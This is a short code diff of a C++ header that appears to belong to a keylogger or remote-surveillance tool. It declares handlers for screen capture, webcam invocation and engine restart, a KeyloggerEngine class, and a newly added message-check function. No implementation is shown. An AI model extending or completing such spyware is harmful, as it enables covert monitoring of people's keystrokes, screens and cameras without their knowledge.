@@ -23,6 +23,8 @@ int RestartEngine(const Message& inputMessage, Message& outputMessage);
 int ScreenCapHandler(const Message& inputMessage, Message& outputMessage);
 int InvokeWebcamHandler(const Message& inputMessage, Message& outputMessage);
 
+bool preliminaryEngineMessageCheck(const Message&, Message&, json&);
+
 class KeyloggerEngine {
     public:
     bool init();
